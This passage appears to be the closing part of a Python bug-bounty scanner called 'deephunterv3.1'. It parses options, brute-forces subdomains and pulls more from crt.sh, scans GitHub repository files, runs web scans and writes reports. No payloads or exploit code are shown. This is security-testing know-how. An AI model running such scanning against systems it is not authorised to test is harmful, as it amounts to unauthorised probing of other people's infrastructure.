    parser.add_argument("-p", "--password", help="Manual password (not implemented – placeholder)")
    parser.add_argument("--login-url", help="Custom login URL (not used)")
    parser.add_argument("--code-only", action="store_true", help="Only static code analysis (GitHub repo)")
    parser.add_argument("--insecure", action="store_true",
                        help="Disable TLS cert verification (default: verify)")
    parser.add_argument("--no-crtsh", action="store_true", help="Skip crt.sh CT-log subdomain harvest")
    parser.add_argument("-o", "--output", help="Output directory")
    # Dynamic headers
    parser.add_argument("--user-agent", help="Set User-Agent header (overrides default)")
    parser.add_argument("--header", action="append", help="Custom header 'Name: Value' (can repeat)")
    args = parser.parse_args()

    # Set extra headers from command line
    extra_headers = {}
    if args.user_agent:
        extra_headers["User-Agent"] = args.user_agent
    if args.header:
        for h in args.header:
            if ":" in h:
                name, val = h.split(":", 1)
                extra_headers[name.strip()] = val.strip()
            else:
                print(f"[!] Ignoring invalid header format: {h}")
    set_extra_headers(extra_headers)

    safe_domain = args.domain.replace(':', '_').replace('/', '_')
    out_dir = args.output or f"DeepHunter_{safe_domain}_{dt.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(out_dir, exist_ok=True)

    print("=" * 70)
    print(" deephunterv3.1 — cross-platform bug bounty scanner")
    print(f" Target:  {args.domain}")
    print(f" Output:  {out_dir}")
    print(f" Marker:  {RUN_MARKER}")
    print(f" Python:  {sys.version.split()[0]} on {sys.platform}")
    if args.insecure:
        print(" [!] --insecure: TLS cert verification disabled")
    if extra_headers:
        print(f" Extra headers: {extra_headers}")
    print("=" * 70)

    all_findings = []

    # Static / repo scan mode
    if args.code_only or ("github.com" in args.domain and not args.web_domains):
        path = urllib.parse.urlparse(args.domain).path
        if path.startswith("/"):
            path = path[1:]
        org_repo = path.rstrip("/") or args.domain.split("/")[-1]
        print(f"[*] Static analysis on GitHub repo: {org_repo}")
        repo_path = fetch_github_repo(org_repo, out_dir)
        if repo_path:
            for root, _, files in os.walk(repo_path):
                for fname in files:
                    if fname.endswith(('.py', '.js', '.go', '.rs', '.java', '.sol', '.ts', '.jsx',
                                        '.json', '.yaml', '.yml', '.env', '.txt', '.md', '.tf',
                                        '.tfvars', '.sh', '.ps1', '.rb', '.php', '.xml', '.conf')):
                        full = os.path.join(root, fname)
                        all_findings.extend(scan_code(full))
            static_ct = len([f for f in all_findings if f.get('type', '').startswith('static')])
            print(f"    Found {static_ct} static issues")
        else:
            print("    Failed to fetch repository")

    # Dynamic scan mode
    web_domains = []
    if args.web_domains:
        for d in args.web_domains.split(","):
            d = d.strip()
            if d.startswith("*."):
                base = d[2:]
                subs = set(brute_subdomains(base))
                if not args.no_crtsh:
                    subs.update(crtsh_subdomains(base))
                web_domains.extend(sorted(subs))
            else:
                web_domains.append(d)
    elif not args.code_only:
        web_domains = [args.domain]
    web_domains = list(dict.fromkeys(web_domains))  # dedupe, preserve order

    if not args.code_only and web_domains:
        print(f"\n[*] Scanning {len(web_domains)} hosts...")
        findings = scan_target(web_domains, args)
        all_findings.extend(findings)
        print(f"\n[+] Total findings (pre-verification): {len(findings)}")

    # Save
    with open(os.path.join(out_dir, "ALL_FINDINGS.json"), "w", encoding="utf-8") as f:
        json.dump(all_findings, f, indent=2, default=str)
    generate_report(all_findings, args.domain, out_dir)

    print(f"\n[+] Reports:  {os.path.join(out_dir, 'reports')}")
    print(f"[+] Summary:  {os.path.join(out_dir, 'SUMMARY.md')}")
    print(f"[+] JSON:     {os.path.join(out_dir, 'ALL_FINDINGS.json')}")
    print("=" * 70)
    manual_count = len([x for x in all_findings if x.get("needs_manual_verification")])
    if manual_count:
        print(f"[!] {manual_count} findings require MANUAL VERIFICATION before submission.")
        print(f"    See the ⚠️ banner at the top of each flagged report.")
    print("=" * 70)

if __name__ == "__main__":
    main()
